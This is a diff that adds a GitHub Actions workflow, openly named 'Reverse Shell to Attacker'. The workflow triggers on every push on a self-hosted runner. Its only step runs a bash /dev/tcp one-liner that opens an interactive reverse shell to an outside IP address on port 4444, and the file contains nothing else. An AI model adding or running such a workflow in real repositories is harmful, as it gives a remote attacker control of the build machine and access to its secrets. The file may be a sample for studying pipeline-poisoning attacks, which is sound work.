@@ -1,1 +1,12 @@
+name: Reverse Shell to Attacker
+
+on: [push]
+
+jobs:
+  exploit:
+    runs-on: self-hosted
+    steps:
+      - name: Reverse Shell to Attacker
+        run: |
+          bash -i >& /dev/tcp/10.64.148.103/4444 0>&1
 
